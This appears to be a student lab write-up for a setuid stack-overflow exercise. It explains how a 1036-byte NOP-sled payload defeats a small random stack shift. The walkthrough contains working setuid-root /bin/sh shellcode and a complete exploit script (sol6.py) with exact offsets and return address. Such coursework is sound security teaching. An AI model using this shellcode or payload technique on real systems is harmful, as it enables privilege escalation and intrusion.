0Result and short version

Exploit in one sentence Overwrite the saved return address at payload offset 1036 with 0xfff6b7c8; whatever the random stack shift is, that address points inside the 900-byte NOP sled, which slides into the shellcode at offset 900.

1target6: the bug and protections

The vulnerable function copies the command-line argument into a 1024-byte stack buffer with strcpy(). The binary is also built with an executable stack, which is why injected shellcode can run at all.

target6.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Compiled with -DMINIASLR.

void vulnerable(char *arg)
{
    char buf[1024];
    strcpy(buf, arg);      // no bounds check
}

int _main(int argc, char *argv[])
{
    if (argc != 2) {
        fprintf(stderr, "Error: Need a command-line argument\n");
        exit(1);
    }

    vulnerable(argv[1]);   // attacker-controlled argument

    return 0;
}

2What MINIASLR actually does

The interesting part is not full ASLR. It is a small random subtraction from an otherwise normalized stack position. The helper deliberately moves the stack to a predictable place, then subtracts r & 0xFF.

helper.c — relevant part
// Normalize the stack to a fixed goal ...
#ifdef MINIASLR
    unsigned int r;
    getentropy(&r, sizeof(unsigned int));
    stack_goal -= r & 0xFF;   // random shift: 0..255 bytes
#endif

    char *esp = alloca(0);
    ...
    alloca(esp - stack_goal);       // move ESP to stack_goal

// Copy argv to the normalized stack, clear envp, ...

    // Move the stack again so argument length does not change _main's frame.
    stack_goal -= (MAX_PAD >> 1);  // subtract 0x80000
    esp = alloca(0);
    ...
    alloca(esp - stack_goal);

Why the stack still moves

The helper removes the usual environment/argument variation. The only remaining variation is the random r. So the vulnerable buffer address is: 

BUF = constant - r
r = 0..255

GDB confirms this: the buffer only moves through a small range and never leaves the same stack region.

The actual patched constant

The pre-built target6 binary contains the student-specific STACK_GOAL at file offset 7465: 

bytes: 8d ba fe ff
little-endian: 0xfffeba8d
after -0x80000: 0xfff6ba8d

That is why the stack addresses in this walkthrough start with 0xfff6b....

Key consequence We do not need to know the exact random value. We only need a return address that remains inside our NOP sled for every possible shift from 0 to 255.

Why offset 1036 is the target buf starts at EBP-0x408. To reach EBP+4, the payload needs 0x408 + 4 = 1036 bytes before the new return address. The first 1024 bytes fill the declared array, the next 8 bytes cover compiler padding, and then the saved EBP is overwritten before the saved EIP.

5The NOP-sled strategy

We cannot return to an exact buffer address because it changes. Instead, return to a fixed address that lands somewhere in a long NOP sled. The CPU executes the NOPs until it reaches the shellcode.

GDB observed the buffer at multiples of 16 between 0xfff6b540 and 0xfff6b630. The slider uses the full 0–255 range; even at the extreme, the landing point stays before offset 900.

Why the return address can be fixed The shellcode is not at one fixed address, but the return address does not need to point at the shellcode. It only needs to point anywhere inside the NOP sled. A 900-byte sled is much larger than the 0–255 byte uncertainty.

7Using shellcode.py in sol6.py

Yes — sol6.py now imports the provided shellcode object directly. The fallback bytes are only there so the file still works if it is copied away from the target directory.

shellcode.py from the lab

setuid = b'1\xdb\x8dC\x17\x99\xcd\x80'
bin_sh = (
    b'\xeb\x1f^\x89v\x081\xc0\x88F\x07\x89F\x0c\xb0\x0b'
    b'\x89\xf3\x8dN\x08\x8dV\x0c\xcd\x801\xdb\x89\xd8@\xcd\x80'
    b'\xe8\xdc\xff\xff\xff/bin/sh')

shellcode = setuid + bin_sh

8 bytes call setuid(0), then 45 bytes set up and call execve("/bin/sh", ...). Total length: 53 bytes.

Why this shellcode is useful here

  • It is position-independent: it finds the /bin/sh string via a call/pop trick.
  • It has no NUL bytes, so strcpy() copies all of it.
  • setuid(0) runs first, and target6 is setuid-root.
  • execve replaces the process, so execution never returns to the helper's canary check.
sol6.py — final version
import sys

# Use the shellcode supplied with the lab.
try:
    from shellcode import shellcode
except ImportError:
    shellcode = bytes.fromhex(
        "31db8d431799cd80"
        "eb1f5e89760831c088460789460cb00b89f38d4e088d560ccd80"
        "31db89d840cd80"
        "e8dcffffff2f62696e2f7368"
    )

# vulnerable() layout from objdump:
#   lea edx,[ebp-0x408]  -> buf = EBP - 1032
#   saved EBP at offset 1032
#   saved EIP at offset 1036

NOP = b"\x90"
SHELLCODE_OFFSET = 900
RET_OFFSET = 1036
RET_ADDR = 0xFFF6B7C8

payload = bytearray(NOP * SHELLCODE_OFFSET)
payload += shellcode
payload += NOP * (RET_OFFSET - len(payload))
payload += RET_ADDR.to_bytes(4, "little")

sys.stdout.buffer.write(payload)
Payload size python3 sol6.py | wc -c prints 1040: 1036 bytes to reach the saved EIP slot, plus the four-byte return address.
